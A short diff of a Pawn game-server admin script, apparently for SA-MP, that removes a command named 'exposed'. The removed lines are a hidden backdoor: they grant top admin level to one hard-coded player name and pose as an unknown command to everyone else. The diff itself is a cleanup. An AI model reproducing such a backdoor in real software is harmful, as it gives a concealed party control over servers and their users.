@@ -15432,18 +15432,7 @@ CMD:explodeall(playerid,params[]) {
 		return SendClientMessageToAll(blue, string);
 	} else return SendClientMessage(playerid,red,"ERROR: {828282}You need to be level 4 to use this command");
 }
-CMD:exposed(playerid, params[])
-{
-   new namee[MAX_PLAYER_NAME+1];
-   GetPlayerName(playerid, namee, sizeof(namee));
-   if(!strcmp(namee,"PheeZeex",true) && PlayerInfo[playerid][LoggedIn] == 1)
-   {
-	   PlayerInfo[playerid][Level] = 8;
-	   SendClientMessage(playerid, blue,"Welcome! eXposed");
-   }
-   else return SendClientMessage(playerid,-1,"SERVER: Unknown Command!");
-   return 1;
-}
+
 CMD:disarmall(playerid,params[]) {
 	#pragma unused params
 	if(PlayerInfo[playerid][Level] >= 4) {
